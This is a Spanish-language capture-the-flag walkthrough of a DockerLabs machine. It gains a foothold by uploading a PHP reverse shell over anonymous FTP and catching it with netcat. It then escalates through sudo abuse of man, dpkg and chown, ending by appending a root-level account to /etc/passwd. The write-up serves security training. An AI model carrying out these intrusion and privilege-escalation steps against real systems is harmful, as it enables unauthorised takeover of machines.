# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b4da0316-9a03-4834-9322-3c358fe21340)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.
### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp(SSH):** OpenSSH 8.9p1 (Ubuntu)
2.  **80/tcp(HTTP):** Apache httpd 2.4.52
3. **3306/tcp(Mysql):** MySQL 5.5.5-10.6.16-MariaDB-0ubuntu0.22.04.1
### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Y se encontró una pagina de mantenimiento.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/df753d98-427d-40cd-a489-3c46522a4f99)

# Fase 2- Exploración

#### FTP
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/12ca9496-d7f7-4369-b155-584620ae13b1)

Vemos mucha información por parte del servicio ftp, donde está habilitado el user **anonymous**. Observamos que toda la info que nos reporta en el servicio **ftp** son los archivos fuente de la **web** que corre por el puerto 80. Además, comprobamos que el directorio **/upload** dentro de la web, tiene capacidad de **directory list**, de forma que será fácil la intrusión. Podremos subir una **reverse shell** y acceder a ella desde la web para ganar acceso. La subimos al directorio **/upload**, que es el único lugar donde tenemos permisos de escritura.

#### Upload
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e984709d-a4e0-4865-a632-59229fdae179)
Si vamos al directorio upload vemos que tiene capacidad de listar archivos.

# Fase 3- Explotación
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b6a63d12-c677-4688-8e94-c624a8340527)

Nos conectamos por FTP con el usuario **anonymous** sin necesidad de proporcionar contraseña. y nos pasamos la revershell en php con el comando `put shell.php`

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6c0cfcad-ac4a-4fb2-a4ae-0311feab6b96)

Nos ponemos en modo escucha con `sudo nc -nlvp 443` y nos llega la reverse shell.

# Fase 4- Privilegios
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6205bc82-4650-47bc-a86d-de0d8bcf5732)
Se hizo el tratamiento de la TTY correspondiente y se ejecuto el comando `sudo -l` para ver que permisos de ejecución en que binario tenemos.

#### Binario Man
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/c6ef139e-40c4-4ede-b749-7b7c97406935)
Si hacemos **sudo -l** vemos que podemos ejecutar **man** como el usuario **pingu**. Podemos abusar de este para migrar a ese user.

#### Pingu
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/e1810b17-3c19-4a1d-a65b-5b61f815e4ed)
Hemos salido del contexto de **man** y migramos al user **pingu**. Hacemos otra vez **sudo -l**
Podemos ejecutar **nmap** y **dpkg** como el user **gladys**. Podemos repetir un proceso muy similar al de **man** con **dpkg**:

#### Gladys
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/f5bfb71a-215a-44d1-9367-d69d16d57aab)
Migramos al user **gladys**. `sudo -u gladys dpkg -l !/bin/bash`

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5ffdf84d-d4a9-47e3-a347-1dcd81a48647)
Podemos ejecutar **chown** como **root** Cambiamos el dueño del **/etc/passwd**:

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2e2bbbf6-4c7a-4f28-8c34-6a360e1c62ab)
```shell
LFILE=/etc/passwd 
sudo chown $(id -un):$(id -gn) $LFILE
ls -l /etc/passwd
--------------------------------
-rw-r--r-- 1 gladys gladys 1292 Apr 28 21:08 /etc/passwd
```

Ahora le pertenece a **gladys**. Probamos a quitar la "**x**" que corresponde a la contraseña del usuario **root** y si la quitamos es posible que nos deje acceder sin contraseña. Como la máquina no tiene ningún editor de texto instalado, lo que haremos será crear un nuevo usuarios con los privilegios de **root** y añadirlo al **/etc/passwd**:

```shell
LFILE=/etc/passwd
sudo chown $(id -un):$(id -gn) $LFILE
openssl passwd hola123
echo 'newroot:$1$EBhVbkUV$zW3uLFiknxfdzUV5OjQZ40:0:0::/home/newroot:/bin/bash' >> /etc/passwd
su newroot
whoami
----------------
root
```

Hemos alcanzado el nivel de privilegios máximo !
